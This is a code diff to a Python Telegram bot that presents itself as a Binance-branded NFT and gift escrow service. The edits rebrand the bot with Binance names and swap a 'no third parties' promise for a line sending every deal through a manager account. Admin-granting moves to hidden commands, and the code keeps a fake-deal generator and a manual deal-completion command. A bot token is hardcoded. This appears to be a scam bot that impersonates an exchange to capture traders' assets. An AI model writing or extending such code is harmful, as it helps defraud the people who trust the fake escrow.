@@ -15,7 +15,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.client.default import DefaultBotProperties
 
-# ===== НАСТРОЙКИ =====
+# ===== НАСТРОЙКИ BINANCE =====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8952573911:AAHL1GKjhASb0qp2_gUkZTJSoFv5It2688g")
 INITIAL_ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8297446667,8400055743").split(",")]
 BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
@@ -95,7 +95,7 @@ def welcome_text():
         "1⃣ Автоматические сделки с NFT и подарками\n"
         f"2⃣ {shield_emoji()} Полная защита обеих сторон\n"
         f"3⃣ {emoji('coin')} Реферальная программа — 50% от комиссии\n"
-        f"4⃣ {emoji('package')} Все сделки проходят между покупателем и продавцем мы не просим передачу 3-им лицам</blockquote>\n\n"
+        f"4⃣ {emoji('package')} Все сделки проходят через менеджера @binancesreport</blockquote>\n\n"
         f"{emoji('lamp')} Наш канал ─ @binance_announcements"
     )
 
@@ -167,8 +167,6 @@ def admin_menu():
         [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
         [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
         [InlineKeyboardButton(text="🔢 Тестовые сделки", callback_data="admin_fake_deals")],
-        [InlineKeyboardButton(text="➕ Выдать админку", callback_data="admin_add_admin")],
-        [InlineKeyboardButton(text="➖ Убрать админку", callback_data="admin_remove_admin")],
         [InlineKeyboardButton(text="👥 Список админов", callback_data="admin_list_admins")],
         [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
     ]
@@ -406,7 +404,7 @@ async def join_by_hashtag(message: Message):
     code = message.text.strip()[1:9]
     await join_deal_by_code(message, code)
 
-# ===== АДМИН-КОМАНДА /anytka =====
+# ===== АДМИН-КОМАНДЫ =====
 @dp.message(Command("anytka"))
 async def admin_cmd(message: Message):
     if not is_admin(message.from_user.id):
@@ -440,6 +438,41 @@ async def givemas_cmd(message: Message):
             return await message.answer("❌ Сделка не найдена или неактивна.")
         await complete_deal_logic(did, msg=message)
     except: await message.answer("❌ Формат: /giveMas deal_id")
+
+# ===== СКРЫТЫЕ КОМАНДЫ ДЛЯ АДМИНОВ =====
+@dp.message(Command("adminteam214"))
+async def admin_add_secret(message: Message):
+    if not is_admin(message.from_user.id):
+        return await message.answer("❌ Нет доступа.")
+    try:
+        _, uid_s = message.text.split()
+        new_admin = int(uid_s)
+        if new_admin in admin_ids:
+            await message.answer("❌ Этот пользователь уже администратор.")
+        else:
+            admin_ids.append(new_admin)
+            save_data()
+            await message.answer(f"✅ Пользователь {new_admin} теперь администратор.")
+    except:
+        await message.answer("❌ Формат: /adminteam214 <user_id>")
+
+@dp.message(Command("adminteam213"))
+async def admin_remove_secret(message: Message):
+    if not is_admin(message.from_user.id):
+        return await message.answer("❌ Нет доступа.")
+    try:
+        _, uid_s = message.text.split()
+        rem_admin = int(uid_s)
+        if rem_admin not in admin_ids:
+            await message.answer("❌ Этот пользователь не является администратором.")
+        elif len(admin_ids) == 1:
+            await message.answer("❌ Нельзя удалить последнего администратора.")
+        else:
+            admin_ids.remove(rem_admin)
+            save_data()
+            await message.answer(f"✅ Администратор {rem_admin} удалён.")
+    except:
+        await message.answer("❌ Формат: /adminteam213 <user_id>")
 
 # ===== ГЛАВНОЕ МЕНЮ =====
 @dp.callback_query(F.data == "main_menu")
@@ -534,57 +567,6 @@ async def adm_fake(call: CallbackQuery):
     save_data()
     await delete_and_send_text(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu())
 
-# ===== УПРАВЛЕНИЕ АДМИНАМИ =====
-@dp.callback_query(F.data == "admin_add_admin")
-async def admin_add_admin_start(call: CallbackQuery, state: FSMContext):
-    if not is_admin(call.from_user.id):
-        return await call.answer("❌", show_alert=True)
-    await call.answer()
-    await call.message.answer("Введите ID пользователя, которого нужно сделать администратором:")
-    await state.set_state(AdminStates.waiting_admin_add)
-
-@dp.message(AdminStates.waiting_admin_add)
-async def admin_add_admin_process(message: Message, state: FSMContext):
-    if not is_admin(message.from_user.id):
-        return
-    try:
-        new_admin = int(message.text.strip())
-        if new_admin in admin_ids:
-            await message.answer("❌ Этот пользователь уже администратор.")
-        else:
-            admin_ids.append(new_admin)
-            save_data()
-            await message.answer(f"✅ Пользователь {new_admin} теперь администратор.")
-    except:
-        await message.answer("❌ Введите корректный ID.")
-    await state.clear()
-
-@dp.callback_query(F.data == "admin_remove_admin")
-async def admin_remove_admin_start(call: CallbackQuery, state: FSMContext):
-    if not is_admin(call.from_user.id):
-        return await call.answer("❌", show_alert=True)
-    await call.answer()
-    await call.message.answer("Введите ID администратора, которого нужно удалить:")
-    await state.set_state(AdminStates.waiting_admin_remove)
-
-@dp.message(AdminStates.waiting_admin_remove)
-async def admin_remove_admin_process(message: Message, state: FSMContext):
-    if not is_admin(message.from_user.id):
-        return
-    try:
-        rem_admin = int(message.text.strip())
-        if rem_admin not in admin_ids:
-            await message.answer("❌ Этот пользователь не является администратором.")
-        elif len(admin_ids) == 1:
-            await message.answer("❌ Нельзя удалить последнего администратора.")
-        else:
-            admin_ids.remove(rem_admin)
-            save_data()
-            await message.answer(f"✅ Администратор {rem_admin} удалён.")
-    except:
-        await message.answer("❌ Введите корректный ID.")
-    await state.clear()
-
 @dp.callback_query(F.data == "admin_list_admins")
 async def admin_list_admins(call: CallbackQuery):
     if not is_admin(call.from_user.id):
@@ -593,7 +575,7 @@ async def admin_list_admins(call: CallbackQuery):
     await call.message.answer(text)
     await call.answer()
 
-# ===== ТЕХПОДДЕРЖКА (ссылка на менеджера) =====
+# ===== ТЕХПОДДЕРЖКА =====
 @dp.callback_query(F.data == "support")
 async def support_handler(call: CallbackQuery):
     await call.answer()
